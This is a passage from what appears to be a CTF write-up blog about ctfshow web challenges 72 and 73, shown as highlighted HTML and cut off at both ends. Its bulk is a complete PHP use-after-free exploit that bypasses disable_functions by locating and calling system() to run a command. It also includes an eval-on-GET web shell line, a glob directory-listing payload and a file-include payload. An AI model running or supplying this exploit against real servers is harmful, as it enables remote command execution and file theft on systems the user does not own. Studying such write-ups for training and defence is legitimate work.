class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="å¤‡æ³¨"><a href="#å¤‡æ³¨" class="headerlink" title="å¤‡æ³¨"></a>å¤‡æ³¨</h2><p>UseAfterFree disable function</p><blockquote><p><a href="https://blog.csdn.net/qq_62414126/article/details/124062044">https://blog.csdn.net/qq_62414126/article/details/124062044</a></p></blockquote><h2 id="ä¸ºä»€ä¹ˆåœ¨ä½¿ç”¨eval-å‡½æ•°æœ‰æ—¶å€™éœ€è¦æ·»åŠ -gt"><a href="#ä¸ºä»€ä¹ˆåœ¨ä½¿ç”¨eval-å‡½æ•°æœ‰æ—¶å€™éœ€è¦æ·»åŠ -gt" class="headerlink" title="ä¸ºä»€ä¹ˆåœ¨ä½¿ç”¨eval()å‡½æ•°æœ‰æ—¶å€™éœ€è¦æ·»åŠ ?&gt;"></a>ä¸ºä»€ä¹ˆåœ¨ä½¿ç”¨eval()å‡½æ•°æœ‰æ—¶å€™éœ€è¦æ·»åŠ ?&gt;</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_GET[1]); #å¦‚æœæˆ‘ä»¬é€šè¿‡&lt;?=`ls`;å»æ‰§è¡Œçš„è¯éœ€è¦åœ¨å‰é¢æ·»åŠ ?&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680271079308-e8ea37f7-98ed-4c6d-bb24-97c1fc8eae1e.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680271079316-0676564d-ce6c-485f-b4a4-0e97d778430d.png" alt="image.png"><br>åŸå› æ˜¯eval()å‡½æ•°ç›¸å½“äºæ‰§è¡Œphpçš„ä»£ç ï¼Œè€Œ<?= å°±ç›¸å½“äº<?php echoåœ¨PHP7ä»¥ä¸Šä¸ç®¡short_open_tagé…ç½®æ˜¯ä¸æ˜¯å¼€å¯çš„ã€‚éƒ½å¯ä»¥ä½¿ç”¨ã€‚æ‰€ä»¥å°±ç›¸å½“äºä¸€ä¸ªæ–°çš„PHPæ–‡ä»¶ï¼Œè¿™æ ·çš„è¯å°±éœ€è¦å°†æœ€å¼€å§‹å‰é¢çš„<?phpç»™é—­åˆï¼Œä¸ç„¶ä¸ä¼šæ‰§è¡Œã€‚é—­åˆä¹‹åå°±ç›¸å½“äº<?php ?> &lt;?=<code>ls</code>;</p><h1 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h1><p>å…ˆæŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶åˆ—è¡¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681223723167-df56bcb3-9699-4868-b367-3d8a06f49f82.png" alt="image.png"><br>flagæ–‡ä»¶åœ¨flagc.txté‡Œé¢ã€‚<br>å®é™…ä¸Šï¼Œè¿™é“é¢˜å¯ä»¥ç›´æ¥ä½¿ç”¨includeæ¥è¯»å–ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flagc.txt&#x27;</span>);<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯çœ‹äº†bç«™çš„è§†é¢‘å‘ç°æ˜¯æƒ³è¦ç”¨ä¸Šä¸€é“é¢˜çš„payloadï¼Œä½†æ˜¯äº¤äº†ä¹‹åå‘ç°æç¤ºè¯´strlenå‡½æ•°è¢«ç¦ç”¨äº†ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681223844662-48c977ec-a595-46e3-b89b-ecf337552378.png" alt="image.png"><br>ç„¶åä»–çš„æƒ³æ³•æ˜¯å°†ç¦ç”¨çš„strlenå‡½æ•°ç»™é‡å†™ã€‚<br>é‚£ä¹ˆç›´æ¥ç®€å•é‡å†™å³å¯ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//strlen è¿”å›å­—ç¬¦ä¸²é•¿åº¦</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">length</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$length</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10000</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">            <span class="variable">$length</span> += <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$length</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åä¿®æ”¹ä¸Šä¸€é“é¢˜çš„payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 